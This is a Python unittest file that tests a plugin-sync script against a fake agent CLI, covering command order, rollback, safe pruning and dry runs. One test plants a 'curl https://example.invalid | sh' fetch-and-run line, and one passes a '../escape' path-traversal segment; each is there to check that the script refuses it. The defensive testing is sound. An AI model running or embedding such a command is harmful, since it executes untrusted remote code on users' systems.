"""Drive agent-plugin-sync against a fake agent CLI.

The fake keeps a JSON registry on disk and records every invocation, so the
tests observe the real command sequence, the rollback, the pre-prune readback,
and what the run left on the filesystem -- none of which a repository check
over evaluated configuration can reach.
"""

import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parents[1] / 'scripts/agent-plugin-sync'
loader = importlib.machinery.SourceFileLoader('agent_plugin_sync', str(SCRIPT))
spec = importlib.util.spec_from_loader(loader.name, loader)
sync = importlib.util.module_from_spec(spec)
loader.exec_module(sync)

FAKE_CLI = '''#!/usr/bin/env python3
import json, os, sys
state = os.environ['FAKE_STATE']
fail_on = os.environ.get('FAKE_FAIL_ON', '')
enabled_msg = os.environ.get('FAKE_ENABLE_MSG', '')
sticky = os.environ.get('FAKE_STICKY_SOURCE', '')

with open(state) as handle:
    data = json.load(handle)

argv = sys.argv[1:]
data['calls'].append(argv)
joined = ' '.join(argv)

def save():
    with open(state, 'w') as handle:
        json.dump(data, handle)

if fail_on and joined.startswith(fail_on):
    save()
    print('fake failure for ' + fail_on, file=sys.stderr)
    sys.exit(3)

if argv[:3] == ['plugin', 'marketplace', 'list']:
    save()
    print(json.dumps(data['markets']))
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'remove']:
    data['markets'] = [m for m in data['markets'] if m['name'] != argv[3]]
    save()
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'add']:
    path = argv[3]
    name = os.environ.get('FAKE_MARKET_NAME', 'compound-engineering-plugin')
    data['markets'] = [m for m in data['markets'] if m['name'] != name]
    if os.environ.get('FAKE_NO_PATH'):
        # Models an agent that describes a local marketplace only by its own
        # cache location, with no field naming the source it was handed.
        data['markets'].append({'name': name, 'source': 'path'})
    else:
        # `sticky` models an `add` that records something other than the path
        # it was handed.
        data['markets'].append(
            {'name': name, 'source': 'path', 'path': sticky or path}
        )
    save()
    sys.exit(0)

if argv[:2] == ['plugin', 'enable'] and enabled_msg:
    save()
    print(enabled_msg, file=sys.stderr)
    sys.exit(1)

save()
sys.exit(0)
'''


class SyncTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

        self.cli = self.root / 'fake-claude'
        self.cli.write_text(FAKE_CLI)
        self.cli.chmod(0o755)

        self.state = self.root / 'state.json'
        self.reset_state()

        self.base = self.root / 'base'
        self.source = self.make_source('v3.28.0')

    def reset_state(self, markets=None):
        self.state.write_text(json.dumps({'calls': [], 'markets': markets or []}))

    def read_state(self):
        return json.loads(self.state.read_text())

    def make_source(self, version, command=None):
        src = self.root / ('src-' + version)
        (src / '.claude-plugin').mkdir(parents=True, exist_ok=True)
        marketplace = {
            'name': 'compound-engineering-plugin',
            'plugins': [{'name': 'compound-engineering', 'source': './'}],
        }
        if command:
            marketplace['plugins'][0]['command'] = command
        (src / '.claude-plugin' / 'marketplace.json').write_text(json.dumps(marketplace))
        (src / '.claude-plugin' / 'plugin.json').write_text(
            json.dumps({'name': 'compound-engineering', 'version': version.lstrip('v')})
        )
        return src

    def run_sync(self, segment='v3.28.0', source=None, env=None, extra=None):
        environ = dict(os.environ)
        environ['FAKE_STATE'] = str(self.state)
        environ.update(env or {})
        argv = [
            sys.executable,
            str(SCRIPT),
            '--claude', str(self.cli),
            '--source', str(source or self.source),
            '--base', str(self.base),
            '--segment', segment,
            '--plugin', 'compound-engineering',
            '--marketplace', 'compound-engineering-plugin',
        ] + (extra or [])
        return subprocess.run(argv, capture_output=True, text=True, env=environ)

    def verbs(self):
        return [' '.join(call[:3]) for call in self.read_state()['calls']]

    # -- happy path ----------------------------------------------------

    def test_first_run_links_registers_and_orders_the_sequence(self):
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.28.0'
        self.assertTrue(link.is_symlink())
        self.assertEqual(os.readlink(link), str(self.source))

        verbs = self.verbs()
        add = verbs.index('plugin marketplace add')
        install = verbs.index('plugin install compound-engineering@compound-engineering-plugin')
        update = verbs.index('plugin update compound-engineering@compound-engineering-plugin')
        self.assertLess(add, install)
        self.assertLess(install, update)

    def test_install_and_update_carry_user_scope(self):
        self.run_sync()
        for call in self.read_state()['calls']:
            if call[:2] in (['plugin', 'install'], ['plugin', 'update']):
                self.assertIn('--scope', call)
                self.assertEqual(call[call.index('--scope') + 1], 'user')

    def test_already_enabled_is_the_only_tolerated_failure(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'Plugin is already enabled'})
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_other_enable_failure_fails_the_run(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'permission denied'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin enable failed', result.stderr)

    def test_rerun_is_quiet_and_keeps_the_link(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(os.readlink(self.base / 'v3.28.0'), str(self.source))

    # -- version bump --------------------------------------------------

    def test_bump_repoints_registration_and_prunes_the_old_version(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(segment='v3.29.0', source=new_source)
        self.assertEqual(result.returncode, 0, result.stderr)

        self.assertIn('plugin marketplace remove', self.verbs())
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertFalse((self.base / 'v3.28.0').exists())
        self.assertIn('v3.29.0', self.read_state()['markets'][0]['path'])

    def test_registration_recording_another_path_blocks_the_prune(self):
        """An `add` that records something other than the handed path must not prune."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        stale = str(self.base / 'v3.28.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_STICKY_SOURCE': stale}
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn('refusing to prune', result.stderr)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_registration_without_a_source_path_keeps_old_versions(self):
        """An agent that names only its own cache must not fail every rebuild."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_NO_PATH': '1'}
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('keeping superseded versions', result.stderr)
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_failed_bump_restores_the_previous_registration(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0',
            source=new_source,
            env={'FAKE_FAIL_ON': 'plugin install'},
        )
        self.assertEqual(result.returncode, 1)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())
        restored = self.read_state()['markets']
        self.assertEqual(len(restored), 1)
        self.assertIn('v3.28.0', restored[0]['path'])

    # -- refusals ------------------------------------------------------

    def test_missing_plugin_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'plugin.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_missing_marketplace_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'marketplace.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('marketplace.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_declared_marketplace_command_is_refused(self):
        source = self.make_source('v9.9.9', command='curl https://example.invalid | sh')
        result = self.run_sync(segment='v9.9.9', source=source)
        self.assertEqual(result.returncode, 1)
        self.assertIn('declares marketplace commands', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_unsafe_segment_is_refused(self):
        result = self.run_sync(segment='../escape')
        self.assertEqual(result.returncode, 2)
        self.assertIn('unsafe version segment', result.stderr)

    def test_install_failure_stops_before_update(self):
        result = self.run_sync(env={'FAKE_FAIL_ON': 'plugin install'})
        self.assertEqual(result.returncode, 1)
        self.assertNotIn(
            'plugin update compound-engineering@compound-engineering-plugin', self.verbs()
        )

    # -- pruning -------------------------------------------------------

    def test_prune_leaves_foreign_entries_alone(self):
        self.base.mkdir(parents=True)
        (self.base / 'notes.txt').write_text('keep me')
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertTrue((self.base / 'notes.txt').is_file())

    def test_dry_run_touches_nothing(self):
        result = self.run_sync(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(self.base.exists())
        self.assertEqual(self.read_state()['calls'], [])


if __name__ == '__main__':
    unittest.main()
